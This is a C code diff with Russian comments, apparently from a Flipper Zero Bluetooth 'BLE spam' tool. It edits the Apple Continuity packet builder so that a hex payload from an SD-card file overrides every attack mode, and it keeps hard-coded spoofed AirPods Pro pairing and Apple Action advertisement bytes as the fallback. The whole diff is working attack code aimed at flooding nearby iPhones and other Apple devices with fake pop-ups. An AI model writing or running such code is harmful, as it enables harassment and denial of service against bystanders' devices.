@@ -20,7 +20,7 @@ static void load_custom_apple_packet(void) {
     custom_payload_len = 0;
     
     if(storage_file_open(file, CUSTOM_PACKETS_PATH, FSAM_READ, FSOM_OPEN_EXISTING)) {
-        char buffer[128]; // Корректный массив-буфер для чтения строки атак
+        char buffer[128]; // Безопасный буфер для чтения строки
         uint16_t read = storage_file_read(file, buffer, sizeof(buffer) - 1);
         if(read > 0) {
             buffer[read] = '\0';
@@ -49,50 +49,46 @@ static void load_custom_apple_packet(void) {
 }
 
 static const char* protocol_continuity_get_name(const BleSpamMsg* msg) {
-    if(msg->type == ContinuityTypeProximityPair) {
+    // Безопасное приведение типов, так как структура совпадает
+    const ContinuityMsg* c_msg = (const ContinuityMsg*)msg;
+    if(c_msg->type == ContinuityTypeProximityPair) {
         return "Proximity Pair";
-    } else if(msg->type == ContinuityTypeAppleAction) {
-        return "Apple Action / Custom File";
     }
-    return "Unknown";
+    return "Apple Attack";
 }
 
 static void protocol_continuity_make_packet(uint8_t* out_tx_data, uint8_t** out_tx_len_ptr, const BleSpamMsg* msg) {
     uint8_t i = 0;
     uint8_t* out_tx_len = *out_tx_len_ptr;
+    const ContinuityMsg* c_msg = (const ContinuityMsg*)msg;
 
-    if(msg->type == ContinuityTypeProximityPair) {
-        out_tx_data[i++] = 0x4C;
-        out_tx_data[i++] = 0x00;
-        out_tx_data[i++] = 0x07;
-        out_tx_data[i++] = 0x19;
-        
-        uint16_t model = 0x0E20; // AirPods Pro по дефолту
-        
+    // Перехватчик: если файл на SD-карте существует, принудительно шлем его HEX для любой атаки
+    load_custom_apple_packet();
+    if(custom_payload_len > 0) {
+        memcpy(out_tx_data, custom_payload, custom_payload_len);
+        *out_tx_len = custom_payload_len;
+        return;
+    }
+
+    // Если кастомного файла нет — генерируем стандартные пакеты, чтобы не ломать оригинальный функционал
+    if(c_msg->type == ContinuityTypeProximityPair) {
+        out_tx_data[i++] = 0x4C; out_tx_data[i++] = 0x00;
+        out_tx_data[i++] = 0x07; out_tx_data[i++] = 0x19;
+        uint16_t model = 0x0E20; // AirPods Pro
         out_tx_data[i++] = (model >> 8) & 0xFF;
         out_tx_data[i++] = model & 0xFF;
-        out_tx_data[i++] = 0x20;
-        out_tx_data[i++] = 0x10;
-        out_tx_data[i++] = 0x42;
-        out_tx_data[i++] = 0x04;
+        out_tx_data[i++] = 0x20; out_tx_data[i++] = 0x10;
+        out_tx_data[i++] = 0x42; out_tx_data[i++] = 0x04;
         while(i < 31) out_tx_data[i++] = rand() % 256;
         *out_tx_len = i;
-
-    } else if(msg->type == ContinuityTypeAppleAction) {
-        load_custom_apple_packet();
-        if(custom_payload_len > 0) {
-            // Перехватываем: пишем данные из файла
-            memcpy(out_tx_data, custom_payload, custom_payload_len);
-            *out_tx_len = custom_payload_len;
-        } else {
-            // Заводской дефолтный пакет, если файла нет на SD
-            out_tx_data[i++] = 0x4C; out_tx_data[i++] = 0x00;
-            out_tx_data[i++] = 0x0F; out_tx_data[i++] = 0x05;
-            out_tx_data[i++] = 0xC1; out_tx_data[i++] = 0x01;
-            out_tx_data[i++] = rand() % 256;
-            out_tx_data[i++] = 0x00; out_tx_data[i++] = 0x00;
-            *out_tx_len = i;
-        }
+    } else {
+        // Дефолтный Action-пакет для всех остальных типов меню
+        out_tx_data[i++] = 0x4C; out_tx_data[i++] = 0x00;
+        out_tx_data[i++] = 0x0F; out_tx_data[i++] = 0x05;
+        out_tx_data[i++] = 0xC1; out_tx_data[i++] = 0x01;
+        out_tx_data[i++] = rand() % 256;
+        out_tx_data[i++] = 0x00; out_tx_data[i++] = 0x00;
+        *out_tx_len = i;
     }
 }
 
